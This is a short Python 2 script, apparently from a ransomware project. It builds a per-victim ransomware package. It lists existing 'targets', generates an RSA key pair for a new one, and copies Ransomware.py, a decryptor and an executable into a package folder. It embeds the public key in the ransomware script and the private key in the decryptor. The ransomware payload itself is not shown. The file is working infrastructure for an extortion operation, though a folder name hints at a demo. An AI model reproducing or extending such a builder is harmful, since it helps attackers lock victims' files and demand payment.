import Crypto, ast, os, sys, glob, socket, random, struct, subprocess, stat
from Crypto.PublicKey import RSA
from Crypto import Random
from os.path import expanduser
from Tkinter import *
from GenAsymKeys import GenAsymKeys
from shutil import copyfile
from stat import *

print("\nCURRENT LIST OF TARGETS:\n")
home = expanduser('~')
targets = glob.glob(home + '/Ransomware/Targets/*')
for path in targets:
    print(path)

name = raw_input("\nName of the new target?: ")
file_path = home + '/Ransomware/Targets/' + name

GenAsymKeys(file_path,name)

#getting the public key that was generated for this target
f = open (file_path + "/publicKey.txt", 'r')
#print(f.read())
key = RSA.importKey(f.read())
f.close()

key_str = key.exportKey('PEM')

#new directory so ransomware to be packaged without private key
rw_dir = file_path + '/RWPackage'
if not os.path.exists(rw_dir):
    os.makedirs(rw_dir)

f = open (file_path + '/publicKey.txt', 'r')
pub_key = f.read()
f.close()

f = open (file_path + '/privateKey.txt', 'r')
priv_key = f.read()
f.close()

rw_dir_s = rw_dir + '/genExes'
copyfile(home + '/TechDemo/genExes', rw_dir_s)

st = os.stat(rw_dir_s)
os.chmod(rw_dir_s, st.st_mode | stat.S_IEXEC)

rw_dir_d = rw_dir + '/R-Decryption.py'
copyfile(home + '/TechDemo/R-Decryption.py', rw_dir_d)

rw_dir_e = rw_dir + '/Ransomware.py'
copyfile(home + '/TechDemo/Ransomware.py', rw_dir_e)

f = open(rw_dir_d, "r")
contents = f.readlines()
f.close()

contents.insert(50, "    priv_key = \"\"\"" +  '    '.join(priv_key.splitlines(True)) + "\"\"\"\n\n")

f = open(rw_dir_d, "w")
contents = "".join(contents)
f.write(contents)
f.close()


f = open(rw_dir_e, "r")
contents = f.readlines()
f.close()

contents.insert(100, "    public_key = \"\"\"" +  '    '.join(pub_key.splitlines(True)) + "\"\"\"\n\n")

f = open(rw_dir_e, "w")
contents = "".join(contents)
f.write(contents)
f.close()
